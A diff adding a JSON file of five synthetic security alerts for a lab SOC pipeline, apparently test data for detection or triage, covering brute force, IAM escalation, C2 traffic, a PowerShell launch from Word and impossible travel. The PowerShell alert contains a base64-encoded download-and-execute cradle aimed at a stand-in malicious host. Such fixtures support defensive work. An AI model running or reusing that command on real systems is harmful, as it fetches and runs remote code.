@@ -1,0 +1,138 @@
+[
+  {
+    "alert_name": "generic_secops_entra_id_bruteforce_success",
+    "alert_id": "ALT-ENTRA-BF-001",
+    "timestamp": "2026-08-17T19:45:00Z",
+    "environment": "generic-secops-lab",
+    "severity": "HIGH",
+    "priority": "HIGH",
+    "risk_score": 85,
+    "mitre_tactic": "TA0006 - Credential Access",
+    "mitre_technique": "T1110 - Brute Force",
+    "entities": {
+      "user_principal_name": "carlos.mendes@company.internal",
+      "compromised_ip": "198.51.100.44",
+      "attack_source_ips": ["198.51.100.44", "198.51.100.45", "198.51.100.46"],
+      "failed_attempts": 6,
+      "success_attempts": 1,
+      "identity_provider": "Microsoft Entra ID"
+    },
+    "raw_data": {
+      "tenant_id": "generic_secops-tenant-id-prod",
+      "app_display_name": "Azure Portal & Office 365",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "location": {
+        "city": "Unknown / TOR Exit Node",
+        "country": "RO"
+      }
+    }
+  },
+  {
+    "alert_name": "generic_secops_gcp_privilege_escalation_sensitive_role",
+    "alert_id": "ALT-GCP-IAM-002",
+    "timestamp": "2026-08-17T19:46:00Z",
+    "environment": "generic-secops-lab",
+    "severity": "CRITICAL",
+    "priority": "HIGH",
+    "risk_score": 95,
+    "mitre_tactic": "TA0004 - Privilege Escalation",
+    "mitre_technique": "T1098 - Account Manipulation",
+    "entities": {
+      "caller_user": "external-contractor@company.internal",
+      "caller_ip": "203.0.113.88",
+      "target_resource": "//cloudresourcemanager.googleapis.com/projects/prj-secops-enterprise-lab",
+      "assigned_role": "roles/owner",
+      "method_name": "google.iam.v1.IAM.SetIamPolicy"
+    },
+    "raw_data": {
+      "service_name": "cloudresourcemanager.googleapis.com",
+      "authorization_info": [
+        {
+          "permission": "resourcemanager.projects.setIamPolicy",
+          "granted": true,
+          "resource": "projects/prj-secops-enterprise-lab"
+        }
+      ],
+      "status": {
+        "code": 0,
+        "message": "OK"
+      }
+    }
+  },
+  {
+    "alert_name": "generic_secops_network_outbound_threat_intel_ioc_match",
+    "alert_id": "ALT-NET-IOC-003",
+    "timestamp": "2026-08-17T19:47:00Z",
+    "environment": "generic-secops-lab",
+    "severity": "CRITICAL",
+    "priority": "HIGH",
+    "risk_score": 100,
+    "mitre_tactic": "TA0011 - Command and Control",
+    "mitre_technique": "T1071 - Application Layer Protocol",
+    "entities": {
+      "internal_source_ip": "10.128.15.22",
+      "destination_c2_ip": "185.220.101.5",
+      "destination_domain": "c2-command-generic_secops-fake.ru",
+      "threat_actor_group": "APT29 / Nobelium Cobalt Strike Infrastructure",
+      "threat_confidence": "HIGH",
+      "threat_severity": "CRITICAL"
+    },
+    "raw_data": {
+      "vpc_network": "vpc-generic_secops-corp",
+      "bytes_sent": 145020,
+      "bytes_received": 89400,
+      "protocol": "TCP",
+      "dest_port": 443
+    }
+  },
+  {
+    "alert_name": "generic_secops_endpoint_suspicious_process_launch",
+    "alert_id": "ALT-EDR-PROC-004",
+    "timestamp": "2026-08-17T19:48:00Z",
+    "environment": "generic-secops-lab",
+    "severity": "HIGH",
+    "priority": "HIGH",
+    "risk_score": 80,
+    "mitre_tactic": "TA0002 - Execution",
+    "mitre_technique": "T1059.001 - PowerShell",
+    "entities": {
+      "hostname": "WKS-FINANCE-042",
+      "internal_ip": "10.128.20.42",
+      "user_principal_name": "rodrigo.alves@company.internal",
+      "process_name": "powershell.exe",
+      "parent_process": "word.exe",
+      "file_sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHgAegAvAHAAOwAnACkA"
+    },
+    "raw_data": {
+      "edr_vendor": "CrowdStrike Falcon",
+      "agent_id": "aid-883492-bb441-generic_secops",
+      "os": "Windows 11 Enterprise 23H2"
+    }
+  },
+  {
+    "alert_name": "generic_secops_identity_impossible_travel_anomaly",
+    "alert_id": "ALT-IMPOSSIBLE-005",
+    "timestamp": "2026-08-17T19:49:00Z",
+    "environment": "generic-secops-lab",
+    "severity": "HIGH",
+    "priority": "HIGH",
+    "risk_score": 85,
+    "mitre_tactic": "TA0001 - Initial Access",
+    "mitre_technique": "T1078 - Valid Accounts",
+    "entities": {
+      "user_principal_name": "ana.pereira@company.internal",
+      "first_login_ip": "189.40.72.10",
+      "second_login_ip": "103.152.220.15",
+      "origin_country": "BR",
+      "destination_country": "SG",
+      "time_delta_minutes": 22
+    },
+    "raw_data": {
+      "origin_city": "Sao Paulo",
+      "destination_city": "Singapore",
+      "calculated_speed_kmh": 42500,
+      "mfa_method_used": "Authenticator Push Approved"
+    }
+  }
+]
